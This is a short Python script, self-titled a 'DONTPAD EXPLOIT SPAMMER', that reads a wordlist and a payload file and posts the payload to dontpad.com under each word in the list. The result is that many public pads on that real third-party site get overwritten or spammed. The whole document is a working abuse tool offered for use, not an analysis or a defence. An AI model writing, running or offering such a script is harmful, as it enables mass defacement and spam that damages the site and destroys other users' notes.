import requests
import sys
from termcolor import colored
print(colored("DONTPAD EXPLOIT SPAMMER - by big0us", "cyan"))
print(colored("Usage: python3 exploit.py <wordlist> <payload>", "cyan"))
wordlist = sys.argv[1]
payload = sys.argv[2]
f = open(payload, "r")
pcontents = f.read()
pcontents = pcontents.rstrip('\n')
print(colored("[INFO]    - Starting...", "yellow"))
print(colored("[INFO]    - Payload: " + payload, "yellow"))
w = open(wordlist, "r")
for line in w:
	line = line.rstrip('\n')
	url = "http://dontpad.com/" + line
	print(colored("[EXPLOIT] - URL: " + url, "red"))
	data= {"text": pcontents}
	r = requests.post(url, data = data)
	